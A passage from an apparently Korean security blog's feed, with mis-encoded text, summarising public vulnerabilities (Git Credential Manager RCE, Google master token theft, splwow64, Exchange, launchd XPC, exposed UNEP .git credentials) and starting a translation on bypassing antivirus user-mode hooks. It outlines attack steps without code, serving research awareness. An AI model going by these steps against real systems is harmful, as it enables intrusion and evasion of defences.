ì—†ê±°ë‚˜ (ë˜ëŠ” í…Œì´ë¸”ì— ì‹œì‘í•  í•­ëª©ì´ 0ì¸ ê²½ìš°) ì²˜ìŒë¶€í„° ëŒ€ìƒ RIPì—ì„œ ë¡œë“œëœ ëª¨ë“ˆì´ ë°œê²¬ë˜ì§€ ì•Šì€ ê²½ìš° <code>STATUS_SET_CONTEXT_DENIED</code>ë¥¼ ë°˜í™˜í•´  <code>longjmp</code> ìœ íš¨ì„±ì„ ê²€ì¦í•œë‹¤.(<code>KCONTINUE_LONGJUMP</code>)</li><li>ì˜ˆì™¸ í•´ì œ ìœ íš¨ì„± ê²€ì‚¬ (<code>KCONTINUE_UNWIND</code>)ì˜ ê²½ìš° <code>RtlpFindDynamicEHContinuationTarget</code>ì„ í˜¸ì¶œí•˜ì—¬ ë“±ë¡ëœ ì—°ì† ëŒ€ìƒì— ëŒ€í•œ ë™ì  ì˜ˆì™¸ í•¸ë“¤ëŸ¬ì¸ì§€ í™•ì¸í•œë‹¤. ë§ìœ¼ë©´ <code>STATUS_SUCCESS</code>ë¥¼ ë°˜í™˜í•˜ê³ , ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ <code>STATUS_SET_CONTEXT_DENIED</code>ë¥¼ ë°˜í™˜í•œë‹¤.</li></ol><h1 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h1><p>CETì˜ êµ¬í˜„ê³¼ ê´€ë ¨ mitigationì€ ROP ë° ê¸°íƒ€ ì œì–´ íë¦„ í•˜ì´ì¬í‚¹ ê¸°ìˆ ì˜ ì‚¬ìš©ì„ ë°©ì§€í•˜ê¸° ìœ„í•œ ì£¼ìš” ë‹¨ê³„ì´ë‹¤. ì œì–´ íë¦„ ë¬´ê²°ì„±ì€ ë¶„ëª… ë³µì¡í•œ ì£¼ì œì´ë©°, í–¥í›„ ì¶”ê°€ì ì¸ mitigationì´ ì¶”ê°€ë¨ì— ë”°ë¼ ë”ìš± ë³µì¡í•´ì§ˆ ê²ƒì´ë‹¤. ì¶”ê°€ì ì¸ í˜¸í™˜ì„± ë¬¸ì œì™€ ì¼íšŒì„± ì‹œë‚˜ë¦¬ì˜¤ë¡œ ì¸í•´ íŠ¹ì • ì²˜ë¦¬ë¥¼ í•„ìš”ë¡œ í•˜ëŠ” ì‚¬ë¡€ê°€ ì ì  ë” ë§ì´ ë°œê²¬ë  ìˆ˜ ìˆë‹¤. ê·¸ëŸ¬ë‚˜ ì™„í™” ê¸°ìˆ , íŠ¹íˆ ë§ì€ ìƒˆë¡œìš´ ê¸°ëŠ¥ì„ í¬í•¨í•˜ëŠ” ê¸°ìˆ ì˜ ë°œì „ë‹¨ê³„ì—ëŠ” ë¬¸ì œê°€ ë°œìƒí•˜ê¸° ë§ˆë ¨ì´ê³ , ìš°ë¦¬ëŠ” ì´ ë¶„ì•¼ì—ì„œ ë” ë§ì€ ì—°êµ¬ê°€ ì´ë£¨ì–´ì§ì— ë”°ë¼ ë¯¸ë˜ì— í¥ë¯¸ë¡œìš´ ê²ƒë“¤ì´ ë°œê²¬ë  ê²ƒì´ë¼ê³  í™•ì‹ í•œë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>rop</tag>
      
      <tag>L0ch</tag>
      
      <tag>cet</tag>
      
      <tag>mitigation</tag>
      
      <tag>translation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-26233: Git CLI RCE</title>
    <link href="/2021/01/16/fabu1ous/2021-01-16/"/>
    <url>/2021/01/16/fabu1ous/2021-01-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/">https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git Credential Manager core &lt; 2.0.289</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì•…ì„± repositoryë¥¼ fork í•œ í”¼í•´ìì˜ ì‹œìŠ¤í…œì— ì„ì˜ì˜ ì‹¤í–‰íŒŒì¼ì„ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆëŠ” CVE-2020-26233ì— ëŒ€í•œ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. ìœ ì‚¬í•œ ì·¨ì•½ì ìœ¼ë¡œ <a href="https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/">CVE-2020-27955</a>ê°€ ìˆìŠµë‹ˆë‹¤.</p><p>git cloneì€ ê¸°ë³¸ì ìœ¼ë¡œ top-level ë””ë ‰í„°ë¦¬ë¥¼ clone í•œ í›„ ìƒˆë¡œìš´ git í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•´ ì¬ê·€ì ìœ¼ë¡œ submoduleë“¤ì„ clone í•©ë‹ˆë‹¤. ë§Œì•½ repositoryì˜ rootë””ë ‰í„°ë¦¬ ì•ˆì— git.exeë¼ëŠ” ì´ë¦„ì˜ ì‹¤í–‰íŒŒì¼ì´ ìˆë‹¤ë©´ Git Credential Manager coreê°€ configurationì„ ì½ëŠ” ê³¼ì •ì—ì„œ í•´ë‹¹ íŒŒì¼ì„ ì‹¤í–‰í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>ì´ëŸ° ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ì´ìœ ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ë§Œì•½ git.exeë¥¼ ì‹¤í–‰í•˜ë¼ëŠ” ëª…ë ¹ì–´ë¥¼ ë°›ìœ¼ë©´ WindowsëŠ” ìš°ì„ ì ìœ¼ë¡œ í˜„ì¬ ë””ë ‰í„°ë¦¬ì— git.exe ì‹¤í–‰íŒŒì¼ì´ ìˆëŠ”ì§€ í™•ì¸í•˜ê³ , ì—†ì„ ë•Œë§Œ %PATH% í™˜ê²½ ë³€ìˆ˜ë¥¼ ìˆœíšŒí•˜ë©´ì„œ git.exeë¥¼ ì°¾ì•„ ì‹¤í–‰í•©ë‹ˆë‹¤. </p><p>PoCëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>ìƒˆë¡œìš´ Repositoryìƒì„±, í˜¹ì€ ê¸°ì¡´ Repositoryì— íŒŒì¼ ì¶”ê°€í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ íšë“</li><li>windows ì‹¤í–‰íŒŒì¼ì˜ íŒŒì¼ëª…ì„ git.exeë¡œ ìˆ˜ì •í•´ ì—…ë¡œë“œ</li><li>ì„ì˜ì˜ ì‚¬ìš©ìê°€ Repositoryë¥¼ fork í•˜ê¸°ë¥¼ ê¸°ë‹¤ë¦¼</li><li>RCE ì„±ê³µ</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Google master token íƒˆì·¨ë¥¼ í†µí•œ êµ¬ê¸€ ê³„ì • ì ‘ê·¼</title>
    <link href="/2021/01/15/l0ch/2021-01-15/"/>
    <url>/2021/01/15/l0ch/2021-01-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.usejournal.com/how-i-stole-the-data-in-millions-of-peoples-google-accounts-aa1b72dcc075">How I stole the data in millions of peopleâ€™s Google accounts</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android/iOS<br>Google accounts</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í”¼ì‹± ì•±ì—ì„œ í•´ì»¤ê°€ Googleì˜ ê³„ì •ê³¼ íŒ¨ìŠ¤ì›Œë“œë¥¼ íƒˆì·¨í•˜ëŠ” ë°©ë²•ì€ ì¼ë°˜ì ìœ¼ë¡œ ì•±ì—ì„œ <code>Google ê³„ì •ìœ¼ë¡œ ê°€ì…</code> ë²„íŠ¼ì„ í†µí•´ í•´ì»¤ê°€ ì œì‘í•œ ë¡œê·¸ì¸ í˜ì´ì§€ì— ê³„ì •ê³¼ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì…ë ¥í•˜ë„ë¡ ìœ ë„í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤.</p><p>Googleì€ ì´ì „ì— ë¡œê·¸ì¸í•œ ì§€ì—­ê³¼ ê±°ë¦¬ê°€ ë¨¼ ì§€ì—­ì—ì„œ ë¡œê·¸ì¸ ì‹œë„ê°€ ìˆì„ ê²½ìš° ì´ë¥¼ ì°¨ë‹¨í•˜ëŠ” ìœ„ì¹˜ ê¸°ë°˜ ë¡œê·¸ì¸ ì°¨ë‹¨ ê¸°ëŠ¥ì´ ìˆì–´ í•´ì»¤ê°€ ê³„ì •ê³¼ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì•Œì•„ë„ í”¼í•´ìì˜ ê³„ì •ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì•ˆë“œë¡œì´ë“œ ê¸°ê¸°ì˜ êµ¬ê¸€ ê³„ì • ê´€ë¦¬ í† í°ì¸ Google master tokenì„ íƒˆì·¨í•˜ë©´ ì´ëŸ¬í•œ ê³„ì • ë³´í˜¸ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. master tokenì€ ì‚¬ìš©ìê°€ ì•”í˜¸ë‚˜ 2ë‹¨ê³„ ë¡œê·¸ì¸ ì„¤ì •ì„ ë³€ê²½í•˜ì§€ ì•ŠëŠ” ì´ìƒ ë§Œë£Œë˜ì§€ ì•Šê³  ìœ„ì¹˜ ê²€ì‚¬ì˜ ëŒ€ìƒì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— ìœ„ì¹˜ ê¸°ë°˜ ë¡œê·¸ì¸ ì°¨ë‹¨ì´ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. </p><p>í”¼í•´ìê°€ í•´ì»¤ì˜ ì•…ì„± ì•±ì„ ì„¤ì¹˜í•˜ê³  êµ¬ê¸€ ê³„ì •ìœ¼ë¡œ ê°€ì…í•˜ë„ë¡ ìœ ë„í•˜ë©´ êµ¬ê¸€ ë¡œê·¸ì¸ í˜ì´ì§€ë¥¼ í†µí•´ í”¼í•´ì ê³„ì •ì˜ master tokenì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆê³  í•´ì»¤ëŠ” ì´ master tokenìœ¼ë¡œ ëŒ€ë¶€ë¶„ì˜ êµ¬ê¸€ ì„œë¹„ìŠ¤ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>L0ch</tag>
      
      <tag>google</tag>
      
      <tag>google credential</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-1648: CVE-2020-0986 íŒ¨ì¹˜ ìš°íšŒ ë° arbitrary address read</title>
    <link href="/2021/01/14/idioth/2021-01-14/"/>
    <url>/2021/01/14/idioth/2021-01-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://whereisk0shl.top/post/the_story_of_cve_2021_1648">THE STORY OF CVE-2021-1648</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows splwow64</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2021ë…„ 1ì›” patch tuesdayì—ì„œ <a href="https://hackyboiz.github.io/2020/12/31/idioth/2020-12-31/">CVE-2020-0986</a> íŒ¨ì¹˜ë¥¼ ìš°íšŒí•˜ëŠ” splwow64 ì„œë¹„ìŠ¤ ì·¨ì•½ì ì„ íŒ¨ì¹˜í–ˆìŠµë‹ˆë‹¤.  CVE-2020-0986ì´ íŒ¨ì¹˜ëœ í›„ splwow64ì™€ gdi32fullì—ëŠ” ë‘ ê°€ì§€ ê²€ì‚¬ê°€ ì¶”ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p><ol><li>í”„ë¦°í„° í•¸ë“¤ ê²€ì‚¬ í•¨ìˆ˜ <code>FindDriverForCookie</code>ì™€ <code>FindPrinterHandle</code> ì¶”ê°€</li><li>í¬ì¸í„° ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìœ„í•œ í•¨ìˆ˜ <code>UMPDStringPointerFromOffset</code>ê³¼ <code>UMPDPointerFromOffset</code> ì¶”ê°€</li></ol><p>1ë²ˆì˜ í•¨ìˆ˜ë“¤ì€ ì „ì—­ ë³€ìˆ˜ì— ì–´ë–¤ í”„ë¦°í„° ë“œë¼ì´ë²„ í•¸ë“¤ì´ ì €ì¥ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ê·¸ì¤‘ <code>0x6A</code> ì»¤ë§¨ë“œë¥¼ í˜¸ì¶œí•˜ë©´ í•¨ìˆ˜ <code>bAddPrinterHandle</code>ê°€ ì „ì—­ ë³€ìˆ˜ <code>qword_1800EABA0</code>ì— ì €ì¥ëœ ë“œë¼ì´ë²„ í™ì— í”„ë¦°íŠ¸ í•¸ë“¤ì„ ì¶”ê°€í•˜ì—¬ ì „ì—­ ë³€ìˆ˜ì— í”„ë¦°í„° í•¸ë“¤ ê°’ì„ ì¡°ì‘í•´ <code>0x6D</code>ì—ì„œ í˜¸ì¶œí•˜ëŠ” <code>FindDriverForCookie</code>ì™€ <code>FindPrinterHandle</code>ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ <code>0x6D</code>ì—ì„œ <code>memcpy</code>ë¥¼ í˜¸ì¶œí•  ë•Œ source addressë¥¼ í™•ì¸í•˜ì§€ ì•Šê³  ë³µì‚¬ë¥¼ ì§„í–‰í•˜ì—¬ arbitrary address readê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>2ë²ˆ í•¨ìˆ˜ë“¤ì€ ì˜ëª»ëœ ë²”ìœ„ ê²€ì‚¬ë¡œ ì¸í•´ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. splwow64ëŠ” x86ì— ëŒ€í•œ í˜¸í™˜ì„±ìœ¼ë¡œ ì¸í•´ í•­ìƒ 32ë¹„íŠ¸ í™ì„ í• ë‹¹í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ë‘ í•¨ìˆ˜ë“¤ì€ offsetê³¼ portview+offsetì´ <code>0x7fffffff</code>ë³´ë‹¤ ì‘ì€ì§€ë§Œ ê²€ì‚¬í•©ë‹ˆë‹¤. splwow64ì—ì„œ í™ì€ ë‚®ì€ ì£¼ì†Œì— í• ë‹¹ë˜ë¯€ë¡œ(ex. <code>0x7d7c70</code>) ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>information disclosure</tag>
      
      <tag>idioth</tag>
      
      <tag>splwow64</tag>
      
      <tag>arbitrary read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16875: RCE in MS Office 365</title>
    <link href="/2021/01/13/fabu1ous/2021-01-13/"/>
    <url>/2021/01/13/fabu1ous/2021-01-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html">https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Exchange server released Before 09/08/2020</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft office 365 Exchange serverì—ì„œ ë°œê²¬ëœ CVE-2020-16875ì˜ write-upì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. <code>New-DlpPolicy</code> cmdletì˜ validation ì‘ì—…ì„ í•˜ëŠ”  <code>NewDlpPolicy.InternalValidate()</code> í•¨ìˆ˜ì—ì„œ ìœ ì €ë¡œë¶€í„° ë°›ì€ TemplateDataë¥¼  pipelineì— ì¶”ê°€í•œ í›„ Powershell commandë¡œ ì‹¤í–‰í•˜ê¸° ë•Œë¬¸ì— code injectionì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•  ê²½ìš° SYSTEMê¶Œí•œìœ¼ë¡œ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p> <code>NewDlpPolicy.InternalValidate()</code>ê°€ í˜¸ì¶œí•˜ëŠ” <code>DlpPolicyTemplateMetaData.ValidateCmdletParameters()</code> í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. </p><ol><li>Inline command ì‚¬ìš©ì„ ë§‰ê¸° ìœ„í•œ ê²€ì‚¬ ìˆ˜í–‰</li><li>validate í•˜ë ¤ëŠ” command ë¬¸ìì—´ì´  <code>New-TransportRule</code>ë¡œ ì‹œì‘í•˜ëŠ”ì§€ ê²€ì‚¬</li><li>validate í•˜ë ¤ëŠ” command ë¬¸ìì—´ì´ <code>-DlpPolicy</code>ì„ ë‹´ê³  ìˆëŠ”ì§€ ê²€ì‚¬</li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1#:~:text=A%20cmdlet%20is%20a%20lightweight,them%20programmatically%20through%20PowerShell%20APIs">https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1#:~:text=A%20cmdlet%20is%20a%20lightweight,them%20programmatically%20through%20PowerShell%20APIs</a>.</p><p><a href="https://docs.microsoft.com/en-us/powershell/module/exchange/new-dlppolicy?view=exchange-ps">https://docs.microsoft.com/en-us/powershell/module/exchange/new-dlppolicy?view=exchange-ps</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>office 365</tag>
      
      <tag>exchange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-9971 : macOS/iOS XPC ì„œë¹„ìŠ¤ ê´€ë¦¬ ì•±ì—ì„œ ë°œê²¬ëœ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/01/12/l0ch/2021-01-12/"/>
    <url>/2021/01/12/l0ch/2021-01-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xlab.tencent.com/en/2021/01/11/cve-2020-9971-abusing-xpc-service-to-elevate-privilege/">CVE-2020-9971 Abusing XPC Service mechanism to elevate privilege in macOS/iOS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>macOS &lt; Big Sur<br>iOS  &lt; 13.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>launchdëŠ” macOSì—ì„œ <code>inetd</code>, <code>xinted</code>ë¥¼ ëŒ€ì²´í•˜ëŠ” ì„œë¹„ìŠ¤ ê´€ë¦¬ ë°ëª¬ì…ë‹ˆë‹¤.<br>ì´ëŸ¬í•œ <code>launchd</code> ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ í”„ë¡œì„¸ìŠ¤ ê°„ í†µì‹  í”„ë¡œí† ì½œì„ ì œê³µí•˜ëŠ” XPC ì„œë¹„ìŠ¤ë¥¼ ê´€ë¦¬í•  ë•Œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><code>launchd</code>ëŠ” <code>launchd process domain</code> ì„ í†µí•´ XPC ì„œë¹„ìŠ¤ë¥¼ ì§€ì •ëœ í”„ë¡œì„¸ìŠ¤ë¡œ ì œí•œí•  ìˆ˜ ìˆìœ¼ë©° í”„ë¡œì„¸ìŠ¤ ë„ë©”ì¸ì€ ì†Œìœ ì í”„ë¡œì„¸ìŠ¤ë§Œ ìˆ˜ì •ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ Big Sur ì´ì „ì˜ <code>launchd</code>ì—ì„œ í”„ë¡œì„¸ìŠ¤ ë„ë©”ì¸ì— XPCë¥¼ ì¶”ê°€í•  ë•Œ í˜¸ì¶œì pidì™€ í”„ë¡œì„¸ìŠ¤ ë„ë©”ì¸ì˜ ì†Œìœ ì pidë¥¼ í™•ì¸í•˜ì§€ ì•Šì•„ í”„ë¡œì„¸ìŠ¤ê°€ ë‹¤ë¥¸ ì„ì˜ì˜ í”„ë¡œì„¸ìŠ¤ì— XPC ì„œë¹„ìŠ¤ë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ í•´ì»¤ì˜ í”„ë¡œì„¸ìŠ¤(ì• í”Œë¦¬ì¼€ì´ì…˜)ê°€ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” í”„ë¡œì„¸ìŠ¤ì˜ ë„ë©”ì¸ì— ì„ì˜ì˜ ì‚¬ìš©ì ì§€ì • XPC ì„œë¹„ìŠ¤ë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆê³ , ì¶”ê°€ëœ XPC ì„œë¹„ìŠ¤ê°€ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤.</p><p>iOS ë˜í•œ macOSì™€ ë™ì¼í•œ <code>launchd</code> ë¡œì§ì„ ì‚¬ìš©í•˜ê³  ìˆìœ¼ë©° iOS 13.5 ì´ì „ ë²„ì „ì— ê°™ì€ ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì• í”Œì€ í˜¸ì¶œì pidê°€ ëŒ€ìƒ í”„ë¡œì„¸ìŠ¤ ë„ë©”ì¸ì˜ ì†Œìœ ìì¸ì§€ í™•ì¸í•˜ëŠ” ì½”ë“œë¥¼ ì¶”ê°€í•´ í•´ë‹¹ ì·¨ì•½ì ì„ íŒ¨ì¹˜í–ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>ios</tag>
      
      <tag>L0ch</tag>
      
      <tag>apple</tag>
      
      <tag>macos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ìœ ì—”í™˜ê²½ê³„íš(UNEP) 10ë§Œëª… ì´ìƒ ì§ì› ê¸°ë¡ ì ‘ê·¼</title>
    <link href="/2021/01/11/idioth/2021-01-11/"/>
    <url>/2021/01/11/idioth/2021-01-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://johnjhacking.com/blog/unep-breach/">UNEP Breached, 100K+ Employee Records Accessed</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ilo.org</li><li>unep.org</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ìœ ì—”ì—ì„œ Git Credentialsì´ ë…¸ì¶œëœ endpointë¥¼ í†µí•´ ì§ì›ë“¤ì˜ ê¸°ë¡ ë° í”„ë¡œì íŠ¸, ë³´ê³ ì„œ ë“±ì˜ ì •ë³´ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ilo.orgì˜ í•˜ìœ„ ë„ë©”ì¸ì— ë…¸ì¶œëœ .git contentê°€ ì¡´ì¬í•©ë‹ˆë‹¤. <a href="https://github.com/arthaud/git-dumper">git-dumper</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡œì íŠ¸ í´ë”ë¥¼ ë¤í”„í•  ìˆ˜ ìˆê³  ì½”ë“œì— ë…¸ì¶œëœ ìê²© ì¦ëª…ìœ¼ë¡œ mysql ë°ì´í„°ë² ì´ìŠ¤ì™€ survey management platformì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/01/11/idioth/2021-01-11/image0.png"></p><p>ë˜í•œ unep.orgì—ì„œ  <code>.git-credentials</code>ê°€ ë…¸ì¶œëœ ì„œë¸Œ ë„ë©”ì¸ì´ ì¡´ì¬í•©ë‹ˆë‹¤. GitHub credentialsë¥¼ í†µí•´ private projectì— ì ‘ê·¼í•  ìˆ˜ ìˆê³  ë°ì´í„°ë² ì´ìŠ¤ ë° ê°ì¢… ì• í”Œë¦¬ì¼€ì´ì…˜ ì •ë³´ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/01/11/idioth/2021-01-11/image1.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>git dump</tag>
      
      <tag>git credential</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] MeMFuck: ìœ ì € ëª¨ë“œ í›„í‚¹ ìš°íšŒ</title>
    <link href="/2021/01/10/idioth/memfuck/"/>
    <url>/2021/01/10/idioth/memfuck/</url>
    
    <content type="html"><![CDATA[<blockquote><p>ì›ë¬¸ ê¸€ : <a href="https://winternl.com/memfuck/">MemFuck: Bypassing User-Mode Hooks</a></p></blockquote><h2 id="ì„œë¬¸"><a href="#ì„œë¬¸" class="headerlink" title="ì„œë¬¸"></a>ì„œë¬¸</h2><p>ë™ì  ì•…ì„±ì½”ë“œ ë¶„ì„ì€ ë§ì€ AV/EDR/MDSì—ì„œ ì•…ì„± í”„ë¡œê·¸ë¨ì„ íƒì§€í•˜ëŠ”ë° ìì£¼ ì‚¬ìš©í•˜ëŠ” ë°©ì‹ì´ë‹¤. ë™ì  ë¶„ì„ì€ ì •ì  ë¶„ì„ê³¼ ë‹¬ë¦¬ ì‹¤í–‰ ê³¼ì •ì—ì„œ ë§Œë“¤ì–´ì§„ ìœˆë„ìš° API í˜¸ì¶œì„ ìº¡ì²˜í•˜ê³  ë¶„ì„í•˜ë©° ì •ì  ë¶„ì„ë³´ë‹¤ íƒì§€ìœ¨ì´ ë†’ë‹¤. system callì„ ìº¡ì²˜í•˜ëŠ”  ë§ì€ ê¸°ìˆ ì´ ìˆì§€ë§Œ ê°€ì¥ ë§ì´ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ user-level hookì´ë‹¤. ì´ëŸ¬í•œ hookì€ ì•…ì„± ê¸°ëŠ¥ì„ ë¶„ì„í•˜ê¸° ìœ„í•´ í•¨ìˆ˜ í˜¸ì¶œì„ ê°€ë¡œì±ˆë‹¤. ì„ì˜ ì‹¤í–‰ íŒŒì¼ì—ì„œ API í˜¸ì¶œì˜ ì‹œí€€ìŠ¤ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs ebnf"><span class="hljs-attribute">OpenProcess</span><span class="hljs-attribute">VirtualAllocEx</span><span class="hljs-attribute">WriteProcessMemory</span><span class="hljs-attribute">CreateRemoteThreadEx</span><span class="hljs-attribute">QueueUserAPC</span><span class="hljs-attribute">NtAlertResumeThread</span></code></pre><p>ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ë“¤ì€ í˜¸ì¶œì´ë‚˜ ê·¸ ì¡°í•©ì„ ê¸°ë°˜ìœ¼ë¡œ ì•…ì„± í–‰ìœ„ë¥¼ ì •ì˜í•œë‹¤. ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ì˜ ì…ì¥ì—ì„œ íŠ¹ì •í•œ í˜¸ì¶œ ì¡°í•©ì€ ì½”ë“œ ì¸ì ì…˜ì´ë©° ëŒ€ë¶€ë¶„ ì•…ì˜ì ì´ê±°ë‚˜ ì›í•˜ì§€ ì•ŠëŠ” í–‰ë™ìœ¼ë¡œ íŒë‹¨ëœë‹¤.</p><p>user-mode hookì€ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ì™€ NGAV, EDR, sandbox, anti-cheat, DRM ë“±ì„ í¬í•¨í•œ ë§ì€ 